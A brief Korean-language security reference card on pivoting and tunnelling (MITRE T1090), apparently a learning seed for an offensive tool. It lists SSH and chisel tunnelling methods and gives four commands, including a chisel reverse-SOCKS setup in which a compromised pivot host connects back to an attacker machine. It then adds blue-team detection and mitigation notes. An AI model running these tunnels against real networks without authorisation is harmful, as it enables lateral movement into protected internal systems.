# 학습 시드(심화): pivoting

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn pivoting`. P1: 머신별 라이트업 미참조.

## 개요
피벗/터널링(T1090): 장악 호스트 경유로 내부망 도달.

## 핵심 기법 · 열거
- SSH 로컬/원격/동적(SOCKS) 포워딩·chisel·ligolo-ng·sshuttle
- proxychains 로 도구 터널링·포트포워딩

## 표준 도구 · 명령
```
ssh -D 1080 user@<pivot>         # 동적 SOCKS → proxychains
ssh -L 8080:127.0.0.1:80 user@<pivot>
chisel server -p 8000 --reverse  # 공격자
chisel client <lhost>:8000 R:socks   # 피벗
```

## 블루팀 탐지
비정상 내부 포워딩·SOCKS 트래픽·장기 SSH 터널·chisel 바이너리.

## 완화
네트워크 분할·egress 통제·비정상 포워딩 탐지·호스트 격리.

- 출처(검증): https://attack.mitre.org/techniques/T1090/
